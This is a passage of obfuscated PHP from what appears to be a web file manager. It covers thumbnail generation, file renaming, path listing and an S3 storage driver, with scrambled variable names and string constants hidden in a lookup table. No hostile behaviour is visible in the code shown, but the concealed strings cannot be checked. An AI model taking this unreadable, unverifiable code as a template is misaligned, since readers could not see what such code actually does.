} public function cacheMethodInfoSet($š¼¤é®¿, $Š¥¼±å, $ÌÒ—…–¼ = false) { $åÇø³ä– =& $_SERVER[§Êá¸İ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($åÇø³ä–[179], $š¼¤é®¿, $Š¥¼±å); $this->cacheMethod($åÇø³ä–[180], $š¼¤é®¿, $Š¥¼±å ? !1 : !0); if (is_array($ÌÒ—…–¼)) { $this->cacheMethod($åÇø³ä–[181], $š¼¤é®¿, $ÌÒ—…–¼); } } public function fileOutImage($µ„×è¿½, $µ˜š—¢Í = 250) { $‹¸Øè‘ =& $_SERVER[§Êá¸İ]; set_timeout(); if (substr($µ„×è¿½, 0, 4) == $‹¸Øè‘[152]) { $this->fileOutLink($µ„×è¿½); } $ëúµú×„ = $this->info($µ„×è¿½); $ä™–­Ë = !1; $âÅÉÌò = isset($GLOBALS[$‹¸Øè‘[182]]) ? $GLOBALS[$‹¸Øè‘[182]] : array(); if ($âÅÉÌò && $âÅÉÌò[$‹¸Øè‘[183]] == $ëúµú×„[$‹¸Øè‘[87]]) { $ëúµú×„ = $âÅÉÌò; $¿¬¡¨½ = $ëúµú×„[$‹¸Øè‘[184]]; if ($¿¬¡¨½ && isset($¿¬¡¨½[$‹¸Øè‘[185]])) { if ($¿¬¡¨½[$‹¸Øè‘[185]] <= $µ˜š—¢Í && $¿¬¡¨½[$‹¸Øè‘[186]] <= $µ˜š—¢Í) { $ä™–­Ë = !0; } } } if ($ëúµú×„[$‹¸Øè‘[79]] <= 1024 * 50 || $ä™–­Ë || !function_exists($‹¸Øè‘[187]) || $ëúµú×„[$‹¸Øè‘[169]] == $‹¸Øè‘[188]) { return $this->fileOut($µ„×è¿½, !1, $ëúµú×„[$‹¸Øè‘[32]]); } $»öƒŒçø = kodIO::hashPath($ëúµú×„); $•èúÅ = "\x63\157\166\x65\x72\137{$»öƒŒçø}\x5f{$µ˜š—¢Í}\56\160\156\147"; $ö›ÑûÕâ = IO_PATH_SYSTEM_TEMP . $‹¸Øè‘[189]; $„û±Ì¿Å = IO::infoFullSimple($ö›ÑûÕâ); $©Õëº×û = $„û±Ì¿Å && is_array($„û±Ì¿Å) ? $„û±Ì¿Å[$‹¸Øè‘[87]] : $‹¸Øè‘[12]; if (!$©Õëº×û) { $©Õëº×û = IO::mkdir($ö›ÑûÕâ); } if ($ëúµú×„[$‹¸Øè‘[190]] == $‹¸Øè‘[191] && isset($ëúµú×„[$‹¸Øè‘[192]]) && $ëúµú×„[$‹¸Øè‘[192]] == kodIO::sourceID($©Õëº×û)) { $Õù¦ş× = $ëúµú×„[$‹¸Øè‘[193]]; if ($µ˜š—¢Í <= 500) { $ÍôÅ˜ü¤ = preg_replace($‹¸Øè‘[194], $‹¸Øè‘[195], $ëúµú×„[$‹¸Øè‘[32]]); $Õù¦ş× = IO::fileNameExist($©Õëº×û, $ÍôÅ˜ü¤); } return IO::fileOut(KodIO::make($Õù¦ş×), !1, $ëúµú×„[$‹¸Øè‘[32]]); } $Ú›€…òª = IO::fileNameExist($©Õëº×û, $•èúÅ); if ($Ú›€…òª) { return IO::fileOut(KodIO::make($Ú›€…òª), !1, $ëúµú×„[$‹¸Øè‘[32]]); } if ($µ˜š—¢Í > 1000) { $this->makeImageCover($©Õëº×û, $µ„×è¿½, $•èúÅ, $µ˜š—¢Í); $this->makeImageCover($©Õëº×û, $µ„×è¿½, "\143\157\166\x65\162\137{$»öƒŒçø}\137\62\65\x30\56\160\156\x67", 250); $Ú›€…òª = IO::fileNameExist($©Õëº×û, $•èúÅ); if ($Ú›€…òª) { return IO::fileOut(KodIO::make($Ú›€…òª), !1, $ëúµú×„[$‹¸Øè‘[32]]); } die; } $Èäáçõ = Cache::get($•èúÅ); if ($Èäáçõ == $‹¸Øè‘[196] || $Èäáçõ == $‹¸Øè‘[197]) { echo $Èäáçõ; die; } Cache::set($•èúÅ, $‹¸Øè‘[197], 60); $Òæ»·øº = array($©Õëº×û, $ëúµú×„[$‹¸Øè‘[87]], $•èúÅ, $µ˜š—¢Í); $°˜­ÉÄ§ = $‹¸Øè‘[198] . $ëúµú×„[$‹¸Øè‘[79]] . $‹¸Øè‘[199] . $•èúÅ . $‹¸Øè‘[200] . $ëúµú×„[$‹¸Øè‘[32]] . $‹¸Øè‘[201] . $ëúµú×„[$‹¸Øè‘[87]]; TaskQueue::add($‹¸Øè‘[202], $Òæ»·øº, $°˜­ÉÄ§, $•èúÅ); } public function makeImageCover($—­ü«°Ô, $õÕª»„ƒ, $¤àİ ö, $¤«®ôüá) { $–ì¶—”ˆ =& $_SERVER[§Êá¸İ]; if (IO::fileNameExist($—­ü«°Ô, $¤àİ ö)) { return $–ì¶—”ˆ[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Ô‘ÜÁª = DATA_THUMB . $¤àİ ö; del_file($Ô‘ÜÁª); $Ö¤˜èéİ = IO::copy($õÕª»„ƒ, TEMP_FILES, !1, $¤àİ ö); if (!@file_exists($Ö¤˜èéİ)) { return $–ì¶—”ˆ[204]; } ImageThumb::createThumb($Ö¤˜èéİ, $Ô‘ÜÁª, $¤«®ôüá, $¤«®ôüá * 10); if (@file_exists($Ô‘ÜÁª)) { Cache::remove($¤àİ ö); return IO::move($Ô‘ÜÁª, $—­ü«°Ô); } Cache::set($¤àİ ö, $–ì¶—”ˆ[196], 600); del_file($Ô‘ÜÁª); return $–ì¶—”ˆ[205] . $Ö¤˜èéİ . $–ì¶—”ˆ[74]; } public function fileOutImageServer($Ÿ†×•Ù‚, $ã‹•ÚÅ– = 250) { $this->fileOutImage($Ÿ†×•Ù‚, $ã‹•ÚÅ–); } public function fileNameAuto($ıù¦Òª³, $˜ÜäšÃù, $ø¿”ËÃˆ = REPEAT_RENAME, $ˆ®®ÆÈœ = false) { $›ÜÜßŸŞ =& $_SERVER[§Êá¸İ]; $öÎÚôŒ³ = $ıù¦Òª³ === $›ÜÜßŸŞ[12] ? $˜ÜäšÃù : rtrim($ıù¦Òª³, $›ÜÜßŸŞ[8]) . $›ÜÜßŸŞ[8] . $˜ÜäšÃù; if ($ø¿”ËÃˆ == REPEAT_REPLACE || !$this->exist($öÎÚôŒ³) || $ˆ®®ÆÈœ && $ø¿”ËÃˆ != REPEAT_RENAME_FOLDER) { return $˜ÜäšÃù; } if ($ø¿”ËÃˆ == REPEAT_SKIP) { return !1; } $Ø³›øû = $›ÜÜßŸŞ[10] . get_path_ext($˜ÜäšÃù); $Ø³›øû = $Ø³›øû == $›ÜÜßŸŞ[10] || $ˆ®®ÆÈœ ? $›ÜÜßŸŞ[12] : $Ø³›øû; $„—”¦–¡ = 1; $˜å–ú­” = substr($˜ÜäšÃù, 0, strlen($˜ÜäšÃù) - strlen($Ø³›øû)); $¿„˜Ôä = $˜å–ú­” . "\50{$„—”¦–¡}\x29{$Ø³›øû}"; while ($this->exist(rtrim($ıù¦Òª³, $›ÜÜßŸŞ[8]) . $›ÜÜßŸŞ[8] . $¿„˜Ôä)) { $¿„˜Ôä = $˜å–ú­” . "\x28{$„—”¦–¡}\x29{$Ø³›øû}"; $„—”¦–¡++; } return $¿„˜Ôä; } private function fileNameAutoList($¸æ¤Óé, $åö«ˆ×µ, $•½×•ññ = false) { $ÈæÂõ¢ =& $_SERVER[§Êá¸İ]; $ß¿ÚË‰‰ = $this->listPath($¸æ¤Óé, !0); $ß¿ÚË‰‰ = array_merge($ß¿ÚË‰‰[$ÈæÂõ¢[85]], $ß¿ÚË‰‰[$ÈæÂõ¢[86]]); $ÙÑÍÇé› = array_to_keyvalue($ß¿ÚË‰‰, $ÈæÂõ¢[12], $ÈæÂõ¢[32]); $Ã§Èšô = $ÈæÂõ¢[10] . get_path_ext($åö«ˆ×µ); $Ã§Èšô = $Ã§Èšô == $ÈæÂõ¢[10] || $•½×•ññ ? $ÈæÂõ¢[12] : $Ã§Èšô; $ÂòÙ¾Ó¤ = substr($åö«ˆ×µ, 0, strlen($åö«ˆ×µ) - strlen($Ã§Èšô)); $‘ÍºÓ„ = $ÂòÙ¾Ó¤ . "\x28\60\x29{$Ã§Èšô}"; for ($²œÍÎ÷„ = 1; $²œÍÎ÷„ <= count($ÙÑÍÇé›) + 1; $²œÍÎ÷„++) { $‘ÍºÓ„ = $ÂòÙ¾Ó¤ . "\x28{$²œÍÎ÷„}\x29{$Ã§Èšô}"; if (!in_array_not_case($‘ÍºÓ„, $ÙÑÍÇé›)) { return $‘ÍºÓ„; } } return $‘ÍºÓ„; } public function listAllFiles($îÚÏáÖ, $é›•ÍİÈ) { $¿èÎàËÎ =& $_SERVER[§Êá¸İ]; if (empty($é›•ÍİÈ)) { return array(); } $ç”ÚÅ™å = array_keys($é›•ÍİÈ); $ÁŠûÈŒ» = array(); $îÚÏáÖ = trim($îÚÏáÖ, $¿èÎàËÎ[8]); foreach ($é›•ÍİÈ as $Âîšº“Ö => $À§È¶Ğá) { $á²„¯íö = ltrim(substr(trim($Âîšº“Ö, $¿èÎàËÎ[8]), strlen($îÚÏáÖ)), $¿èÎàËÎ[8]); if (substr($Âîšº“Ö, -1) == $¿èÎàËÎ[8]) { $á²„¯íö = rtrim($á²„¯íö, $¿èÎàËÎ[8]) . $¿èÎàËÎ[8]; } $ÁŠûÈŒ» = array_merge($ÁŠûÈŒ», $this->slicePath($á²„¯íö)); } $§ÍÁşê = array(); foreach (array_unique($ÁŠûÈŒ») as $İÊòÚª˜) { $¨­¦ß¿´ = array($¿èÎàËÎ[87] => $this->getPathOuter($¿èÎàËÎ[8] . $îÚÏáÖ . $¿èÎàËÎ[8] . $İÊòÚª˜), $¿èÎàËÎ[78] => 1, $¿èÎàËÎ[79] => 0); if (substr($İÊòÚª˜, -1) != $¿èÎàËÎ[8]) { $¨­¦ß¿´[$¿èÎàËÎ[78]] = 0; $ÏĞ·Ïİ¹ = $this->getPath($îÚÏáÖ . $¿èÎàËÎ[8] . $İÊòÚª˜); if (isset($é›•ÍİÈ[$ÏĞ·Ïİ¹])) { $­¡¡‹“ = $é›•ÍİÈ[$ÏĞ·Ïİ¹]; if (isset($­¡¡‹“[$¿èÎàËÎ[79]])) { $¨­¦ß¿´[$¿èÎàËÎ[79]] = intval($­¡¡‹“[$¿èÎàËÎ[79]]); } if (isset($­¡¡‹“[$¿èÎàËÎ[206]])) { $¨­¦ß¿´[$¿èÎàËÎ[88]] = intval($­¡¡‹“[$¿èÎàËÎ[206]]); } } } $§ÍÁşê[] = $¨­¦ß¿´; } return $§ÍÁşê; } public function slicePath($âñğÒºë) { $¬·¾¥Üª =& $_SERVER[§Êá¸İ]; $ÜÊåÇ·ã = explode($¬·¾¥Üª[8], trim($âñğÒºë, $¬·¾¥Üª[8])); $áÂÛ—¤‚ = 0; do { ++$áÂÛ—¤‚; $É÷ß˜ğñ[] = implode($¬·¾¥Üª[8], array_slice($ÜÊåÇ·ã, 0, $áÂÛ—¤‚)) . $¬·¾¥Üª[8]; } while ($áÂÛ—¤‚ < count($ÜÊåÇ·ã)); $É÷ß˜ğñ[count($ÜÊåÇ·ã) - 1] = $âñğÒºë; return $É÷ß˜ğñ; } public function getHost() { $¶¡€÷¶ø =& $_SERVER[§Êá¸İ]; $–·ô‚º– = parse_url(trim($this->domain, $¶¡€÷¶ø[8])); $òõõùóŞ = isset($–·ô‚º–[$¶¡€÷¶ø[207]]) ? $–·ô‚º–[$¶¡€÷¶ø[207]] : http_type(); $ìîÍÒÕ± = isset($–·ô‚º–[$¶¡€÷¶ø[208]]) ? $–·ô‚º–[$¶¡€÷¶ø[208]] : $–·ô‚º–[$¶¡€÷¶ø[87]]; if (isset($–·ô‚º–[$¶¡€÷¶ø[209]])) { $ìîÍÒÕ± .= $¶¡€÷¶ø[4] . $–·ô‚º–[$¶¡€÷¶ø[209]]; } return $òõõùóŞ . $¶¡€÷¶ø[210] . $ìîÍÒÕ±; } public function pathEncode($÷À˜èï£) { $¦£âİÌ£ =& $_SERVER[§Êá¸İ]; return str_replace($¦£âİÌ£[211], $¦£âİÌ£[8], rawurlencode($÷À˜èï£)); } public function writeLog($óØÄÕ÷ı = '', $‰Ë­¾ª· = false) { $§Ÿ­šıÁ =& $_SERVER[§Êá¸İ]; $óÔè¶øì = in_array(ACTION, array($§Ÿ­šıÁ[212], $§Ÿ­šıÁ[213])); if (!$óÔè¶øì && !GLOBAL_DEBUG) { return; } $“Ñ–Ú© = $óØÄÕ÷ı; static $±ışÂ• = null; if (!$±ışÂ•) { $±ışÂ• = strtoupper($this->getType()); } $óØÄÕ÷ı = $±ışÂ• . $§Ÿ­šıÁ[214] . $óØÄÕ÷ı; if ($‰Ë­¾ª·) { $ÆûÕÇÚğ = error_get_last(); if ($ÆûÕÇÚğ) { $óØÄÕ÷ı = array($óØÄÕ÷ı, $ÆûÕÇÚğ); } } write_log($óØÄÕ÷ı, $§Ÿ­šıÁ[215]); if ($óÔè¶øì) { throw new Exception($“Ñ–Ú©); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Ü°Ğ™Òë) { set_timeout(); require_once SDK_DIR . $_SERVER[§Êá¸İ][216]; parent::__construct(); $this->_init($Ü°Ğ™Òë); } public function _init($ØãÒä×) { $ìò„¸š =& $_SERVER[§Êá¸İ]; $this->config = $ØãÒä×; foreach ($ØãÒä× as $ĞË×ş™ => $—·£Ó÷) { if (isset($this->{$ĞË×ş™})) { $this->{$ĞË×ş™} = $—·£Ó÷; } } $this->endpoint = $ØãÒä×[$ìò„¸š[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($ìò„¸š[212], $ìò„¸š[213]))) { $this->client->setExceptions(); } } public function setSignVersion($À³Ï¦Ù = "\166\64") { $this->signVer = $À³Ï¦Ù; $this->client->setSignatureVersion($À³Ï¦Ù); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ ‘÷ÌªÁ) { return null; } } public function isBucketCors() { $ß¹¶É€ì =& $_SERVER[§Êá¸İ]; $ò—â€Ÿ« = $this->getBucketCors(); if (!$ò—â€Ÿ« || !is_array($ò—â€Ÿ«)) { return !1; } if (!is_array($ò—â€Ÿ«[$ß¹¶É€ì[218]])) { $ò—â€Ÿ«[$ß¹¶É€ì[218]] = explode($ß¹¶É€ì[50], $ò—â€Ÿ«[$ß¹¶É€ì[218]]); } if ($ò—â€Ÿ«[$ß¹¶É€ì[219]] != $ß¹¶É€ì[220] || !in_array($ß¹¶É€ì[220], $ò—â€Ÿ«[$ß¹¶É€ì[218]])) { return !1; } $ÆğşâÛ‚ = array_map($ß¹¶É€ì[221], $ò—â€Ÿ«[$ß¹¶É€ì[222]]); if (!is_array($ÆğşâÛ‚)) { $ÆğşâÛ‚ = array(); } $ªÚŠÖÏÉ = array($ß¹¶É€ì[223], $ß¹¶É€ì[224], $ß¹¶É€ì[225], $ß¹¶É€ì[226], $ß¹¶É€ì[227]); $‹£’û’• = array_diff($ªÚŠÖÏÉ, $ÆğşâÛ‚); return empty($‹£’û’•); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($¹­øØì‚, $»ÀüÊ = '', $€·€¤ƒ = REPEAT_RENAME) { $ûÜÍ¶€á = $this->setContent($¹­øØì‚, $»ÀüÊ); if ($ûÜÍ¶€á !== !1) { return $this->getPathOuter($¹­øØì‚); } return !1; } public function mkdir($™¾‚îèŞ, $ÛƒÎÉ£ = REPEAT_SKIP) { $‘¶øÒ²Œ =& $_SERVER[§Êá¸İ]; if (empty($™¾‚îèŞ) && $™¾‚îèŞ !== $‘¶øÒ²Œ[228]) { return !1; } if ($ÛƒÎÉ£ && $this->_isFolder($™¾‚îèŞ)) { return $this->getPathOuter($™¾‚îèŞ); } $Øë·™ãì = $this->setContent($™¾‚îèŞ, $‘¶øÒ²Œ[12], !0); if ($Øë·™ãì !== !1) { return $this->getPathOuter($™¾‚îèŞ); } return !1; } public function copyFile($ˆ›‡™ìÂ, $§‘Ì£, $ÍûËšÌÛ = array()) { $ÅèƒÑ± =& $_SERVER[§Êá¸İ]; $²Ì©®Øò = $this->objectMeta($ˆ›‡™ìÂ); if (!$²Ì©®Øò) { return !1; } if ($²Ì©®Øò[$ÅèƒÑ±[79]] <= 1024 * 1024 * 200) { $£«®°·Ê = $this->client->copyObject($this->bucket, $ˆ›‡™ìÂ, $this->bucket, $§‘Ì£, $ÅèƒÑ±[229], $ÍûËšÌÛ); } else { $£«®°·Ê = $this->client->multiCopyObject($this->bucket, $ˆ›‡™ìÂ, $this->bucket, $§‘Ì£, $ÍûËšÌÛ); } $£«®°·Ê = $£«®°·Ê ? $this->getPathOuter($§‘Ì£) : !1; return $£«®°·Ê; } public function moveFile($Ë½›šğ, $ÁïœÒ) { if ($this->copyFile($Ë½›šğ, $ÁïœÒ)) { $this->delFile($Ë½›šğ); return $this->getPathOuter($ÁïœÒ); } return !1; } public function delFile($Ê©Å´şå) { return $this->client->deleteObject($this->bucket, $Ê©Å´şå); } public function delFolder($É¼‰¤İ–) { $ÂÆ…Ÿ›õ =& $_SERVER[§Êá¸İ]; if (!$this->exist($É¼‰¤İ–)) { return !0; } $this->listItemCache = !1; $İˆÛ‹¢è = $this->fileList($É¼‰¤İ–); $this->listItemCache = !0; $Ï‹¸€‡ = trim($É¼‰¤İ–, $ÂÆ…Ÿ›õ[8]) . $ÂÆ…Ÿ›õ[8]; if (!empty($É¼‰¤İ–) && $É¼‰¤İ– !== $ÂÆ…Ÿ›õ[228] && !in_array($Ï‹¸€‡, $İˆÛ‹¢è[$ÂÆ…Ÿ›õ[85]])) { $İˆÛ‹¢è[$ÂÆ…Ÿ›õ[85]][] = $Ï‹¸€‡; } $Úş¸¹Šï = $this->delByBatch($İˆÛ‹¢è[$ÂÆ…Ÿ›õ[86]]); if (!$Úş¸¹Šï) { return !1; } $Úş¸¹Šï = $this->delByBatch($İˆÛ‹¢è[$ÂÆ…Ÿ›õ[85]]); if (!$Úş¸¹Šï) { return !1; } return $this->delFile($Ï‹¸€‡); } private function delByBatch($óÅÑÒ©è) { foreach (array_chunk($óÅÑÒ©è, 1000) as $úÍ‘çù) { $ı“¼ş¦ = $this->client->deleteObjects($this->bucket, $úÍ‘çù); if (!$ı“¼ş¦) { return !1; } } return !0; } public function rename($ÈŠ¼…çÏ, $ØÑâë€ş) { return $this->renameObject($ÈŠ¼…çÏ, $ØÑâë€ş); } public function listPath($ªºñ–Ã˜, $È´Ù‡‘™ = false) { $Û›ƒ´õƒ =& $_SERVER[§Êá¸İ]; $½ÔÕò÷ = $this->fileList($ªºñ–Ã˜, $Û›ƒ´õƒ[8], !0); foreach ($½ÔÕò÷[$Û›ƒ´õƒ[85]] as $Ùş“Åé— => $µ°ÜÅÜŒ) { $½ÔÕò÷[$Û›ƒ´õƒ[85]][$Ùş“Åé—] = $this->folderInfo($µ°ÜÅÜŒ, $È´Ù‡‘™, $µ°ÜÅÜŒ); } foreach ($½ÔÕò÷[$Û›ƒ´õƒ[86]] as $Ùş“Åé— => $µ°ÜÅÜŒ) { $½ÔÕò÷[$Û›ƒ´õƒ[86]][$Ùş“Åé—] = $this->fileInfo($µ°ÜÅÜŒ[$Û›ƒ´õƒ[32]], $È´Ù‡‘™, $µ°ÜÅÜŒ); } return $½ÔÕò÷; } protected function infoChildren($µÒ¡Æ¨ı, &$ÊŞ¢Ÿ‹) { $×ÙÇ“¬ =& $_SERVER[§Êá¸İ]; $ êÆÓ½™ = $this->fileList($µÒ¡Æ¨ı, $×ÙÇ“¬[12], !0); $ÊŞ¢Ÿ‹[$×ÙÇ“¬[81]] += count($ êÆÓ½™[$×ÙÇ“¬[85]]); $ÊŞ¢Ÿ‹[$×ÙÇ“¬[80]] += count($ êÆÓ½™[$×ÙÇ“¬[86]]); foreach ($ êÆÓ½™[$×ÙÇ“¬[86]] as $½éş˜ç•) { if (!$½éş˜ç• || !$½éş˜ç•[$×ÙÇ“¬[79]]) { continue; } $ÊŞ¢Ÿ‹[$×ÙÇ“¬[79]] += $½éş˜ç•[$×ÙÇ“¬[79]]; } } private function fileInfo($ÑŞëèëç, $ªšÇ»ÔÑ = false, $èŸŒª¢Ä = array()) { $¹˜´íğÅ =& $_SERVER[§Êá¸İ]; $«¹­şÎ› = array($¹˜´íğÅ[32] => $this->pathThis($ÑŞëèëç), $¹˜´íğÅ[87] => $this->getPathOuter($ÑŞëèëç), $¹˜´íğÅ[33] => $¹˜´íğÅ[230], $¹˜´íğÅ[169] => $this->ext($ÑŞëèëç), $¹˜´íğÅ[79] => isset($èŸŒª¢Ä[$¹˜´íğÅ[79]]) ? $èŸŒª¢Ä[$¹˜´íğÅ[79]] : 0); if ($ªšÇ»ÔÑ) { return $«¹­şÎ›; } $«¹­şÎ›[$¹˜´íğÅ[231]] = $«¹­şÎ›[$¹˜´íğÅ[88]] = 0; $«¹­şÎ›[$¹˜´íğÅ[232]] = $«¹­şÎ›[$¹˜´íğÅ[233]] = !0; if (empty($èŸŒª¢Ä)) { $èŸŒª¢Ä = $this->objectMeta($ÑŞëèëç); if (!$èŸŒª¢Ä) { return $«¹­şÎ›; } } if (isset($èŸŒª¢Ä[$¹˜´íğÅ[234]]) && $èŸŒª¢Ä[$¹˜´íğÅ[234]]) { $«¹­şÎ›[$¹˜´íğÅ[235]] = $èŸŒª¢Ä[$¹˜´íğÅ[234]]; } if (isset($èŸŒª¢Ä[$¹˜´íğÅ[206]])) { $«¹­şÎ›[$¹˜´íğÅ[88]] = $èŸŒª¢Ä[$¹˜´íğÅ[206]]; } if (isset($èŸŒª¢Ä[$¹˜´íğÅ[79]])) { $«¹­şÎ›[$¹˜´íğÅ[79]] = $èŸŒª¢Ä[$¹˜´íğÅ[79]]; } return $«¹­şÎ›; } private function folderInfo($ú’ü–¼–, $Ğˆ¿÷‡´ = false, $ÀÌ¦¢Ä© = array()) { $êŠÅ’ù =& $_SERVER[§Êá¸İ]; $‘çüü¼ = array($êŠÅ’ù[32] => $this->pathThis($ú’ü–¼–), $êŠÅ’ù[87] => $this->getPathOuter($êŠÅ’ù[8] . $ú’ü–¼–), $êŠÅ’ù[33] => $êŠÅ’ù[78]); if ($Ğˆ¿÷‡´) { return $‘çüü¼; } $‘çüü¼[$êŠÅ’ù[231]] = $‘çüü¼[$êŠÅ’ù[88]] = 0; $‘çüü¼[$êŠÅ’ù[232]] = $‘çüü¼[$êŠÅ’ù[233]] = !0; if ($ú’ü–¼– == $êŠÅ’ù[12]) { return $‘çüü¼; } if (empty($ÀÌ¦¢Ä©)) { $ÀÌ¦¢Ä© = $this->objectMeta(trim($ú’ü–¼–, $êŠÅ’ù[8]) . $êŠÅ’ù[8]); } if (isset($ÀÌ¦¢Ä©[$êŠÅ’ù[206]])) { $‘çüü¼[$êŠÅ’ù[231]] = $ÀÌ¦¢Ä©[$êŠÅ’ù[206]]; } return $‘çüü¼; } private function fileList($¦Ï¼ç¿±, $Ë¡øúŒ• = '', $¦öœ†éõ = 0) { $¦ßâúè­ =& $_SERVER[§Êá¸İ]; $©¼õ¤“ê = rtrim($¦Ï¼ç¿±, $¦ßâúè­[8]) . $¦ßâúè­[8]; $«»¤çÔ = $this->listObjs($©¼õ¤“ê, null, null, $Ë¡øúŒ•); if (!$«»¤çÔ) { return array($¦ßâúè­[85] => array(), $¦ßâúè­[86] => array()); } $…¥åÑÏÜ = $™÷¢ÕÉ± = array(); foreach ($«»¤çÔ[$¦ßâúè­[236]] as $è×š¢Âî) { $æ›¬¥‚– = $è×š¢Âî[$¦ßâúè­[32]]; if ($æ›¬¥‚– == $©¼õ¤“ê) { continue; } $ÓÎà¶ƒÙ = isset($è×š¢Âî[$¦ßâúè­[79]]) ? $è×š¢Âî[$¦ßâúè­[79]] : 0; $æ±ÄÈ‰º = $ÓÎà¶ƒÙ == 0 && substr($æ›¬¥‚–, strlen($æ›¬¥‚–) - 1, 1) == $¦ßâúè­[8] ? !0 : !1; $this->cacheMethodInfoSet($æ›¬¥‚–, $æ±ÄÈ‰º, $è×š¢Âî); if ($æ±ÄÈ‰º) { $…¥åÑÏÜ[] = $æ›¬¥‚–; continue; } $™÷¢ÕÉ±[] = $¦öœ†éõ ? $è×š¢Âî : $æ›¬¥‚–; } foreach ($«»¤çÔ[$¦ßâúè­[237]] as $è×š¢Âî) { $…¥åÑÏÜ[] = $è×š¢Âî[$¦ßâúè­[32]]; $this->cacheMethodInfoSet($è×š¢Âî[$¦ßâúè­[32]], !0); } $this->cacheMethodInfoSet($¦Ï¼ç¿±, !0); return array($¦ßâúè­[85] => $…¥åÑÏÜ, $¦ßâúè­[86] => $™÷¢ÕÉ±); } private function listObjs($ĞíŠô, $›ÄàËÛ = null, $ÃÁ‘Û¯¨ = null, $¾×‡É±‰ = null) { $İÒ‰ĞÁÊ =& $_SERVER[§Êá¸İ]; $ĞíŠô = trim($ĞíŠô, $İÒ‰ĞÁÊ[8]); $ğª”ûÏ‹ = empty($ĞíŠô) && $ĞíŠô !== $İÒ‰ĞÁÊ[228] ? $İÒ‰ĞÁÊ[12] : $ĞíŠô . $İÒ‰ĞÁÊ[8]; return $this->client->getBucket($this->bucket, $ğª”ûÏ‹, $›ÄàËÛ, $ÃÁ‘Û¯¨, $¾×‡É±‰, !0); } public function has($§ÒÒÌ˜…, $ÇÇòà‡ö = false, $Á¥€éğ = true) { $Ø®ê¸µ =& $_SERVER[§Êá¸İ]; $§ÒÒÌ˜… = trim($§ÒÒÌ˜…, $Ø®ê¸µ[8]); $Œ¶¨ÇËˆ = empty($§ÒÒÌ˜…) && $§ÒÒÌ˜… !== $Ø®ê¸µ[228] ? $Ø®ê¸µ[12] : $§ÒÒÌ˜… . $Ø®ê¸µ[8]; $Í´¶ƒ‡Ó = null; $¸úä‰€Ä = 500; $ Ş±òäÔ = $Ø®ê¸µ[8]; $Š«–í¤° = $ºæËªÑ² = array(); while (!0) { $½åÌš‹‚ = $this->listObjs($§ÒÒÌ˜…, $Í´¶ƒ‡Ó, $¸úä‰€Ä, $ Ş±òäÔ); if (!$½åÌš‹‚) { break; } $Í´¶ƒ‡Ó = $½åÌš‹‚[$Ø®ê¸µ[238]]; $„³¬ÕÂ = $½åÌš‹‚[$Ø®ê¸µ[236]]; $É…«µ™Á = $½åÌš‹‚[$Ø®ê¸µ[237]]; if (empty($„³¬ÕÂ) && empty($É…«µ™Á)) { break; } if (count($„³¬ÕÂ) == 1 && $„³¬ÕÂ[0][$Ø®ê¸µ[32]] == $Œ¶¨ÇËˆ) { break; } if ($ÇÇòà‡ö) { if (count($„³¬ÕÂ)) { $„³¬ÕÂ = array_column($„³¬ÕÂ, $Ø®ê¸µ[32]); $Š«–í¤° = array_merge($Š«–í¤°, $„³¬ÕÂ); } if (count($É…«µ™Á)) { $É…«µ™Á = array_column($É…«µ™Á, $Ø®ê¸µ[32]); $ºæËªÑ² = array_merge($ºæËªÑ², $É…«µ™Á); } if ($Í´¶ƒ‡Ó === null) { break; } continue; } if ($Á¥€éğ) { if (!empty($„³¬ÕÂ)) { if (count($„³¬ÕÂ) > 1 || isset($„³¬ÕÂ[0][$Ø®ê¸µ[32]]) && $„³¬ÕÂ[0][$Ø®ê¸µ[32]] != $Œ¶¨ÇËˆ) { return !0; } } } else { if (!empty($É…«µ™Á)) { return !0; } } if ($Í´¶ƒ‡Ó === null) { break; } } if ($ÇÇòà‡ö) { $Š«–í¤° = array_diff($Š«–í¤°, array($Œ¶¨ÇËˆ)); $Š«–í¤° = count(array_unique($Š«–í¤°)); $ºæËªÑ² = count(array_unique($ºæËªÑ²)); return array($Ø®ê¸µ[239] => $Š«–í¤°, $Ø®ê¸µ[240] => $ºæËªÑ²); } return !1; } public function listAll($Çü°Ô¨) { $ÁĞê¤Œ© =& $_SERVER[§Êá¸İ]; $ èÆ÷™ü = $this->fileList($Çü°Ô¨, $ÁĞê¤Œ©[12], !0); $íÆæ–Ã = array_to_keyvalue($ èÆ÷™ü[$ÁĞê¤Œ©[86]], $ÁĞê¤Œ©[32]); foreach ($ èÆ÷™ü[$ÁĞê¤Œ©[85]] as $…ö“ºÀ) { if (is_string($…ö“ºÀ)) { $íÆæ–Ã[$…ö“ºÀ] = array($ÁĞê¤Œ©[79] => 0); } } return $this->listAllFiles($Çü°Ô¨, $íÆæ–Ã); } public function canRead($µ¥²¤“˜) { $«ü»ØßÊ =& $_SERVER[§Êá¸İ]; $üêŒ¡Ã = $this->client->getAccessControlPolicy($this->bucket, $µ¥²¤“˜); if (!$üêŒ¡Ã) { return !1; } return in_array($üêŒ¡Ã, array($«ü»ØßÊ[241], $«ü»ØßÊ[242], $«ü»ØßÊ[243])) ? !0 : !1; } public function canWrite($¾œ‚†ò³) { $°ÍÜÅÀÆ =& $_SERVER[§Êá¸İ]; $è¤¬úÓÍ = $this->client->getAccessControlPolicy($this->bucket, $¾œ‚†ò³); if (!$è¤¬úÓÍ) { return !1; } return in_array($è¤¬úÓÍ, array($°ÍÜÅÀÆ[241], $°ÍÜÅÀÆ[242])) ? !0 : !1; } public function getContent($í¥‡ã©µ) { return $this->client->getObject($this->bucket, $í¥‡ã©µ); } public function setContent($ç¸º‘…, $‰Ü‚ªõ¹ = '', $ÇÇ×âş = false) { $šĞëñ’ë =& $_SERVER[§Êá¸İ]; $ç¸º‘… = $ÇÇ×âş ? trim($ç¸º‘…, 